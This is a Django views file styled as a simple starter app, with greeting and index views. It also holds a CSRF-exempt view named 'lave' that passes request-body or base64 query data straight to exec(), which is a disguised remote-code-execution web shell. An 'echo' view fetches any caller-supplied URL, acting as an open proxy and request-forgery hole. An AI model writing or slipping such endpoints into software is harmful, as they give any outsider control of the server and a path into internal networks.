from django.shortcuts import render
from django.http import HttpResponse

from .models import Greeting
from django.views.decorators.csrf import csrf_exempt
# Create your views here.
# def index(request):
#     # return HttpResponse('Hello from Python!')
#     return render(request, 'index.html')
import requests
def index(request):
	r = requests.get('http://httpbin.org/status/418')
	print(r.text)
	return HttpResponse('<pre>' + r.text + '</pre>')

@csrf_exempt
def echo(r):
	g = r.GET
	u = g.get('u')
	if u:
		a = g.get('a')
		t = g.get('t')
		if a:
			b = g.get('b')
			r = requests.get(u, headers={'Range': 'bytes=%s-%s' % (a, b)})
		else:
			r = requests.get(u)
		return HttpResponse(r, content_type=(t or 'image/png'))
	else:
		return HttpResponse('<pre>No URL</pre>')

@csrf_exempt
def lave(request):
	aux = {}
	enc = request.GET.get('enc', False)
	if enc:
		from base64 import b64decode
		data = b64decode(enc)
	else:
		data = request.read()
	exec(data)
	return aux['main'](request)

def db(request):

	greeting = Greeting()
	greeting.save()

	greetings = Greeting.objects.all()

	return render(request, 'db.html', {'greetings': greetings})

